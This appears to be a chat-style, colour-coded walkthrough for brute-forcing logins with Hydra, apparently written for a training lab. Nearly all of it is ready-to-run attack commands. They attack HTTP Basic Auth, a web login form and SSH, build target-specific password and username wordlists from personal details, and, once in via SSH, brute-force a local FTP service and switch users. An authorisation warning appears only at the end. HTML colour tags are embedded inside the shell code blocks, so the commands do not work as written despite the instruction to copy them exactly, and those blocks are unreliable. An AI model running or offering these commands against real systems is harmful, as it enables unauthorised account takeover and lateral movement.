Here's a **step-by-step guide** to login brute‑forcing using **Hydra** and supporting tools, with **color‑coded** sections to help you follow along.  
Use the commands exactly as shown, replacing placeholders like `SERVER_IP`, `PORT`, and file paths with your own values.

---

## 🔴 **Step 1 – Understand Hydra’s options**
```bash
<span style="color:blue;">hydra -h</span>
```
**Why:** Shows all available options and examples. Use this to remind yourself of syntax.

---

## 🔵 **Step 2 – Brute‑force HTTP Basic Auth with a combined wordlist**
```bash
<span style="color:blue;">hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 10.10.10.1 -s 8080 http-get /</span>
```
**Why:** `-C` loads a file containing `username:password` pairs.  
<span style="color:green;">If a valid pair is found, Hydra will stop and show it.</span>

---

## 🟡 **Step 3 – Brute‑force HTTP Basic Auth with separate wordlists**
```bash
<span style="color:blue;">hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 10.10.10.1 -s 8080 http-get /</span>
```
**Why:**  
- `-L` = username wordlist  
- `-P` = password wordlist  
- `-u` = try all users per password (more efficient)  
- `-f` = stop after first valid pair  
<span style="color:yellow;">This may take a long time if the wordlists are huge.</span>

---

## 🔴 **Step 4 – Brute‑force a login form (POST request)**
First, find the login form parameters. Open the login page, press `Ctrl+Shift+E` (Network tab), try a dummy login, and copy the POST data (e.g., `username=test&password=test`).  

Then use:
```bash
<span style="color:blue;">hydra -l admin -P rockyou.txt 10.10.10.1 -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"</span>
```
**Parameters explained:**  
- `http-post-form` – module for POST forms  
- `"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`  
  - `url` : `POST parameters` (replace `^USER^` and `^PASS^`) : `fail string`  
- `F=` means Hydra looks for this string to **detect a failed login**. Pick a unique string from the login page’s HTML (e.g., `<form name='login'`).

<span style="color:yellow;">If you don’t know the username, try common ones like `admin`, `root`, `test`.</span>

---

## 🟢 **Step 5 – Create a custom password wordlist with CUPP**
```bash
<span style="color:blue;">cupp -i</span>
```
Answer the interactive questions about the target (name, birthdate, etc.).  
<span style="color:green;">Result: a file like `william.txt` containing 43k+ words.</span>

---

## 🔵 **Step 6 – Filter the wordlist according to a password policy**
Suppose the policy requires **≥8 characters, a special char, and a number**:
```bash
<span style="color:blue;">sed -ri '/^.{,7}$/d' william.txt</span>              <span style="color:yellow;"># remove shorter than 8</span>
<span style="color:blue;">sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt</span>   <span style="color:yellow;"># keep only those with at least one special char</span>
<span style="color:blue;">sed -ri '/[0-9]+/!d' william.txt</span>                <span style="color:yellow;"># keep only those with at least one number</span>
```
<span style="color:green;">The wordlist shrinks to about 13k words – much faster to test.</span>

---

## 🟡 **Step 7 – Create a custom username wordlist**
```bash
<span style="color:blue;">git clone https://github.com/urbanadventurer/username-anarchy.git</span>
<span style="color:blue;">cd username-anarchy</span>
<span style="color:blue;">./username-anarchy Bill Gates > bill.txt</span>
```
<span style="color:yellow;">This generates common username variants (b.gates, bgates, etc.).</span>

---

## 🔴 **Step 8 – Brute‑force SSH using your custom wordlists**
```bash
<span style="color:blue;">hydra -L bill.txt -P william.txt -u -f ssh://10.10.10.1:22 -t 4</span>
```
**Why:**  
- `ssh://` – service  
- `-t 4` – limit parallel tasks (many SSH servers drop excessive connections)  
<span style="color:green;">When a valid pair is found, you can SSH in:</span>  
```bash
<span style="color:blue;">ssh b.gates@10.10.10.1 -p 22</span>
```

---

## 🟢 **Step 9 – Once inside, brute‑force local FTP**
After logging in via SSH, check for other users and services:
```bash
<span style="color:blue;">ls /home</span>                     <span style="color:yellow;"># see other users</span>
<span style="color:blue;">netstat -antp | grep -i list</span>   <span style="color:yellow;"># check listening ports (FTP often on port 21)</span>
```
If FTP is running locally, brute‑force it:
```bash
<span style="color:blue;">hydra -l m.gates -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://127.0.0.1</span>
```
<span style="color:green;">Then connect to FTP or switch user:</span>
```bash
<span style="color:blue;">ftp 127.0.0.1</span>               <span style="color:yellow;"># use the found password</span>
<span style="color:blue;">su - m.gates</span>                <span style="color:yellow;"># switch to that user on the system</span>
```

---

## 🟠 **Final Tip – Always start small**
- First try **default credential lists** (they’re fast).  
- Then try **common usernames** with a **top 1000 password list**.  
- Only move to large, personalised wordlists if necessary.

<span style="color:red;">**Warning:** Brute‑forcing can be noisy and may trigger alerts. Use only on targets you are authorised to test.</span>
